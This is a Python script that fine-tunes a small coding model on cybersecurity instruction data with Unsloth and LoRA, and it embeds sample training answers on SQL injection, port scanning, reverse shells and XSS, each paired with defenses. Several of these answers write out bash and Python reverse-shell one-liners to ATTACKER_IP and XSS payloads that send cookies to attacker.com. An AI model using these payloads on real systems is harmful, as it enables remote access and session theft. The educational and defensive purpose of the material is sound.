#!/usr/bin/env python3
"""
Bombina Fine-tuning Script using Unsloth
Fast LoRA fine-tuning for cybersecurity domain

Note: Requires a GPU with sufficient VRAM (8GB+ recommended for 3B model)
For 4GB VRAM, use smaller batch sizes or gradient accumulation
"""

import os
from pathlib import Path
from datasets import load_dataset, Dataset
from unsloth import FastLanguageModel
from trl import SFTTrainer
from transformers import TrainingArguments
import torch

# Paths
BASE_DIR = Path(__file__).parent.parent
DATA_DIR = BASE_DIR / "data" / "training"
OUTPUT_DIR = BASE_DIR / "models" / "bombina-finetuned"

# Model configuration
MAX_SEQ_LENGTH = 2048
DTYPE = None  # Auto-detect
LOAD_IN_4BIT = True  # Use 4-bit quantization for lower VRAM

def create_sample_training_data():
    """Create sample training data for cybersecurity fine-tuning"""
    
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    
    # Sample cybersecurity training data (expand this!)
    training_examples = [
        {
            "instruction": "Explain SQL injection and how to prevent it",
            "output": """SQL injection is a code injection attack where malicious SQL statements are inserted into entry fields. 

**How it works:**
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$input'

-- Attacker input: ' OR '1'='1
-- Results in: SELECT * FROM users WHERE username = '' OR '1'='1'
```

**Prevention:**
1. Use parameterized queries/prepared statements
2. Input validation and sanitization
3. Use ORMs with proper escaping
4. Implement least privilege database access
5. Web Application Firewalls (WAF)

**Example of safe code (Python):**
```python
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```"""
        },
        {
            "instruction": "Write a Python script to scan for open ports",
            "output": """```python
#!/usr/bin/env python3
import socket
import concurrent.futures
from typing import List, Tuple

def scan_port(host: str, port: int, timeout: float = 1.0) -> Tuple[int, bool]:
    \"\"\"Scan a single port and return (port, is_open)\"\"\"
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            return (port, result == 0)
    except socket.error:
        return (port, False)

def scan_ports(host: str, ports: List[int], max_workers: int = 100) -> List[int]:
    \"\"\"Scan multiple ports concurrently\"\"\"
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(scan_port, host, port): port for port in ports}
        for future in concurrent.futures.as_completed(futures):
            port, is_open = future.result()
            if is_open:
                open_ports.append(port)
                print(f"[+] Port {port} is OPEN")
    return sorted(open_ports)

if __name__ == "__main__":
    target = input("Target IP: ")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 8080]
    print(f"\\nScanning {target}...")
    open_ports = scan_ports(target, common_ports)
    print(f"\\nOpen ports: {open_ports}")
```

**Usage:** Only use on systems you have permission to test."""
        },
        {
            "instruction": "What is a reverse shell and how do attackers use it?",
            "output": """A **reverse shell** is a type of shell where the target machine initiates a connection back to the attacker's machine, giving the attacker command-line access.

**Why attackers use it:**
- Bypasses firewalls (outbound connections usually allowed)
- NAT traversal (target initiates connection)
- Persistence after initial compromise

**Common reverse shell payloads:**

**Bash:**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

**Python:**
```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Detection & Defense:**
1. Monitor outbound connections to unusual ports
2. Use egress filtering
3. Network segmentation
4. EDR solutions monitoring process behavior
5. Audit unusual process trees (web server spawning shells)

**For defenders:** Always assume your network may be compromised and implement defense in depth."""
        },
        {
            "instruction": "Explain XSS (Cross-Site Scripting) attack types",
            "output": """**Cross-Site Scripting (XSS)** allows attackers to inject malicious scripts into web pages viewed by other users.

## Three Types of XSS:

### 1. Reflected XSS
Script is reflected off the web server in error messages, search results, etc.
```html
<!-- Malicious URL -->
https://victim.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

### 2. Stored XSS
Script is permanently stored on the target server (database, comment field, etc.)
```html
<!-- Stored in a comment -->
<script>fetch('https://attacker.com/log?cookie='+document.cookie)</script>
```

### 3. DOM-based XSS
Payload is executed as a result of modifying the DOM in the victim's browser.
```javascript
// Vulnerable code
document.getElementById('output').innerHTML = location.hash.substring(1);
// Attack: https://victim.com/page#<img src=x onerror=alert(1)>
```

## Prevention:
1. **Output encoding** - HTML encode user input
2. **Content Security Policy (CSP)** headers
3. **HttpOnly cookies** - Prevents JS access to cookies
4. **Input validation** - Whitelist allowed characters
5. **Use frameworks** that auto-escape (React, Angular)

```python
# Safe output in Python/Flask
from markupsafe import escape
return f"Hello, {escape(user_input)}"
```"""
        },
    ]
    
    # Save as JSONL
    import json
    output_file = DATA_DIR / "cybersecurity_training.jsonl"
    with open(output_file, 'w') as f:
        for example in training_examples:
            f.write(json.dumps(example) + '\n')
    
    print(f"Created sample training data: {output_file}")
    print(f"Add more examples to improve fine-tuning!")
    return output_file

def format_prompt(example):
    """Format training examples into instruction format"""
    return f"""### Instruction:
{example['instruction']}

### Response:
{example['output']}"""

def finetune_bombina():
    """Fine-tune the Bombina model using Unsloth"""
    
    print("🐸 Bombina Fine-tuning with Unsloth")
    print("=" * 50)
    
    # Check for training data
    training_file = DATA_DIR / "cybersecurity_training.jsonl"
    if not training_file.exists():
        print("No training data found. Creating sample data...")
        create_sample_training_data()
    
    # Load base model with Unsloth
    print("\nLoading base model...")
    model, tokenizer = FastLanguageModel.from_pretrained(
        model_name="unsloth/Qwen2.5-Coder-3B-Instruct",
        max_seq_length=MAX_SEQ_LENGTH,
        dtype=DTYPE,
        load_in_4bit=LOAD_IN_4BIT,
    )
    
    # Add LoRA adapters
    print("Adding LoRA adapters...")
    model = FastLanguageModel.get_peft_model(
        model,
        r=16,  # LoRA rank
        target_modules=["q_proj", "k_proj", "v_proj", "o_proj",
                       "gate_proj", "up_proj", "down_proj"],
        lora_alpha=16,
        lora_dropout=0,
        bias="none",
        use_gradient_checkpointing="unsloth",
        random_state=42,
    )
    
    # Load training data
    print("Loading training data...")
    dataset = load_dataset('json', data_files=str(training_file), split='train')
    
    # Format dataset
    def format_examples(examples):
        texts = []
        for instruction, output in zip(examples['instruction'], examples['output']):
            text = format_prompt({'instruction': instruction, 'output': output})
            texts.append(text)
        return {'text': texts}
    
    dataset = dataset.map(format_examples, batched=True)
    
    # Training arguments (optimized for 4GB VRAM)
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    
    training_args = TrainingArguments(
        output_dir=str(OUTPUT_DIR),
        per_device_train_batch_size=1,  # Small batch for low VRAM
        gradient_accumulation_steps=4,
        warmup_steps=5,
        max_steps=60,  # Adjust based on dataset size
        learning_rate=2e-4,
        fp16=not torch.cuda.is_bf16_supported(),
        bf16=torch.cuda.is_bf16_supported(),
        logging_steps=1,
        save_steps=20,
        optim="adamw_8bit",
        weight_decay=0.01,
        lr_scheduler_type="linear",
        seed=42,
    )
    
    # Initialize trainer
    trainer = SFTTrainer(
        model=model,
        tokenizer=tokenizer,
        train_dataset=dataset,
        args=training_args,
        max_seq_length=MAX_SEQ_LENGTH,
    )
    
    # Train
    print("\nStarting fine-tuning...")
    print("This may take a while depending on your GPU...")
    trainer.train()
    
    # Save the model
    print("\nSaving fine-tuned model...")
    model.save_pretrained(OUTPUT_DIR / "lora_adapters")
    tokenizer.save_pretrained(OUTPUT_DIR / "lora_adapters")
    
    # Also save as GGUF for Ollama
    print("\nExporting to GGUF format for Ollama...")
    model.save_pretrained_gguf(
        str(OUTPUT_DIR / "gguf"),
        tokenizer,
        quantization_method="q4_k_m",
    )
    
    print(f"\n✅ Fine-tuning complete!")
    print(f"LoRA adapters saved to: {OUTPUT_DIR / 'lora_adapters'}")
    print(f"GGUF model saved to: {OUTPUT_DIR / 'gguf'}")
    print(f"\nTo use in Ollama, create a Modelfile pointing to the GGUF file.")

if __name__ == "__main__":
    finetune_bombina()
